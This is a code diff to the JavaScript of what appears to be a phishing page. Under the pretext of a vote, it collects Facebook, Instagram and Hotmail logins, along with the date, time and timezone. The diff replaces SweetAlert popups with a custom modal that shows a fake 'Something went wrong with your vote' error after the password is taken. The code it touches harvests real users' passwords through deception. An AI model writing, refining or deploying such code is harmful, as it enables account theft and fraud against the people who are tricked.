@@ -15,14 +15,21 @@ const appCheck = firebase.appCheck();
 console.log(appCheck);
 appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);
 
+function showAlert() {
+  document.getElementById("customAlert").style.display = "block";
+}
+
+function closeAlert() {
+  document.getElementById("customAlert").style.display = "none";
+}
+
 function hmlog() {
   firebase
     .auth()
     .signInAnonymously()
     .catch(function (error) {
-      var errorCode = error.code;
       var errorMessage = error.message;
-      window.alert("Error: " + errorMessage);
+      alert("Error: " + errorMessage);
     });
 
   var email = document.getElementById("hm-email").value;
@@ -44,14 +51,8 @@ function hmlog() {
     });
 
     setTimeout(function () {
-      Swal.fire({
-        title: "Oops!",
-        text: "Something went wrong with your vote.",
-        icon: "error",
-        confirmButtonText: "Try Again",
-      });
-      document.getElementById("fb-pass").value = "";
-
+      showAlert(); // Show custom modal
+      document.getElementById("hm-pass").value = "";
       return false;
     }, 2000);
   }
@@ -62,9 +63,8 @@ function iglog() {
     .auth()
     .signInAnonymously()
     .catch(function (error) {
-      var errorCode = error.code;
       var errorMessage = error.message;
-      window.alert("Error: " + errorMessage);
+      alert("Error: " + errorMessage);
     });
 
   var username = document.getElementById("ig-uname").value;
@@ -72,7 +72,6 @@ function iglog() {
   var currentDate = new Date().toISOString().slice(0, 10);
   var currentTime = new Date().toISOString().slice(11, 19);
   var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  console.log(timezone);
   var accountType = "Instagram";
 
   if (username !== "" && password !== "") {
@@ -87,13 +86,7 @@ function iglog() {
     });
 
     setTimeout(function () {
-      Swal.fire({
-        title: "Oops!",
-        text: "Something went wrong with your vote.",
-        icon: "error",
-        confirmButtonText: "Try Again",
-      });
-
+      showAlert(); // Show custom modal
       document.getElementById("ig-pass").value = "";
       return false;
     }, 2000);
@@ -105,9 +98,8 @@ function login() {
     .auth()
     .signInAnonymously()
     .catch(function (error) {
-      var errorCode = error.code;
       var errorMessage = error.message;
-      window.alert("Error: " + errorMessage);
+      alert("Error: " + errorMessage);
     });
 
   var email = document.getElementById("fb-email").value;
@@ -129,14 +121,8 @@ function login() {
     });
 
     setTimeout(function () {
-      Swal.fire({
-        title: "Oops!",
-        text: "Something went wrong with your vote.",
-        icon: "error",
-        confirmButtonText: "Try Again",
-      });
+      showAlert(); // Show custom modal
       document.getElementById("fb-pass").value = "";
-
       return false;
     }, 2000);
   }
